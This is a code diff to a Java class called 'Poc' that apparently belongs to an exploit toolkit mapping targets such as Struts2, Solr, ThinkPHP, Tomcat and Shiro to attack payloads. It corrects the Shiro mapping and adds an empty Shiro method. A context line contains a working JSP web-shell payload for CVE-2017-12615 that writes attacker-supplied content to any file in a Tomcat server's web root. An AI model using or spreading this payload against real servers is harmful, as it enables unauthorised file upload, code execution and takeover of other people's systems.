@@ -12,7 +12,7 @@ public class Poc {
         value_static.app_list.put("Solr",solr());
         value_static.app_list.put("Think_php",Thinkphp());
         value_static.app_list.put("Tomcat",Tomcat());
-        value_static.app_list.put("Shiro",Tomcat());
+        value_static.app_list.put("Shiro",Shiro());
     }
     public static Map<String,String> Strust2(){
         Map <String,String> map=new HashMap<>();
@@ -71,6 +71,10 @@ public class Poc {
         Map <String,String> map=new HashMap<>();
         // post型的 url上要加上xx.jsp
         map.put("CVE-2017-12615", "<%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.getRealPath(\"/\")+request.getParameter(\"f\"))).write(request.getParameter(\"t\").getBytes());%>");
+        return map;
+    }
+    public  static Map<String,String> Shiro(){
+        Map <String,String> map=new HashMap<>();
         return map;
     }
 }
